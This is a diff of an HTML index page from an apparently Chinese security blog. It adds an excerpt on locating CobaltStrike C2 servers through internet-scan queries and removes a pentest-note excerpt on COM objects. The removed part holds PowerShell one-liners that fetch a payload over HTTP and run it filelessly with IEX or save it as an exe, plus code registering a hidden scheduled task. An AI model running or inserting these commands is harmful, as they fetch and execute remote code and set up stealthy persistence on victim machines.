@@ -117,6 +117,58 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/01/04/CloudFront-find-cobaltstrike.html" >CobaltStrike的Stager特征隐藏</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-04  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
+<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
+<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
+<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
+	
+
+	</div>
+  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
+<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
+<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
+<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
+	
+	</div>
+  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/09/10/redis-windows-hijack.html" >Redis On Windows -- Dll Hijack</a>
 		</h3>
 		</div>
@@ -461,134 +513,6 @@ plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-number
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-07-16  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
-</blockquote>
-<p>我就瞎写了:</p>
-<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
-<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
-$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
-powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
-$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
-$Instance.Connect()
-$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
-$Task &#x3D; $Instance.NewTask(0)
-$Trigger &#x3D; $Task.triggers.Create(0)
-$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
-$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
-$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
-$Trigger.Enabled &#x3D; $True
-$Trigger.Id &#x3D; $Taskname
-$Action &#x3D; $Task.Actions.Create(0)
-$Action.Path &#x3D; “cmd.exe”
-$Action.Arguments &#x3D; “&#x2F;c whoami”
-$Action.HideAppWindow &#x3D; $True
-$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
-
-function Convert-Date &#123;       
-
-        param(
-             [datetime]$Date
-
-        )       
-
-        PROCESS &#123;
-               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
-        &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
-</ul>
-
-	
-
-	</div>
-  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
-</blockquote>
-<p>我就瞎写了:</p>
-<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
-<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
-$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
-powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
-$Instance &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Schedule.Service&quot;))
-$Instance.Connect()
-$Folder &#x3D; $Instance.GetFolder(&quot;\&quot;)
-$Task &#x3D; $Instance.NewTask(0)
-$Trigger &#x3D; $Task.triggers.Create(0)
-$Trigger.StartBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay))
-$Trigger.EndBoundary &#x3D; Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
-$Trigger.ExecutionTimelimit &#x3D; &quot;PT5M&quot;
-$Trigger.Enabled &#x3D; $True
-$Trigger.Id &#x3D; $Taskname
-$Action &#x3D; $Task.Actions.Create(0)
-$Action.Path &#x3D; “cmd.exe”
-$Action.Arguments &#x3D; “&#x2F;c whoami”
-$Action.HideAppWindow &#x3D; $True
-$Folder.RegisterTaskDefinition($TaskName, $Task, 6, &quot;&quot;, &quot;&quot;, 3)
-
-function Convert-Date &#123;       
-
-        param(
-             [datetime]$Date
-
-        )       
-
-        PROCESS &#123;
-               $Date.Touniversaltime().tostring(&quot;u&quot;) -replace &quot; &quot;,&quot;T&quot;
-        &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html</a></li>
-</ul>
-
-	
-	</div>
-  <a type="button" href="/2020/07/16/Com-Object-Pentest-Note2.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -640,7 +564,7 @@ function Convert-Date &#123;
 		
 			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
 		
-			<li><a href="/categories/Java/">Java<span>6</span></a></li>
+			<li><a href="/categories/Java/">Java<span>7</span></a></li>
 		
 			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
 		
@@ -667,6 +591,10 @@ function Convert-Date &#123;
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
+      </li>
+    
+      <li>
         <a href="/2022/04/14/memory-shell-1.html" ><i class="fa fa-file-o"></i>Java安全笔记(3)-内存马之Filter型</a>
       </li>
     
@@ -680,10 +608,6 @@ function Convert-Date &#123;
     
       <li>
         <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" ><i class="fa fa-file-o"></i>低版本Java运行高版的Class</a>
-      </li>
-    
-      <li>
-        <a href="/2022/03/22/java-reflection-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(2)-反射执行系统命令</a>
       </li>
     
   </ul>
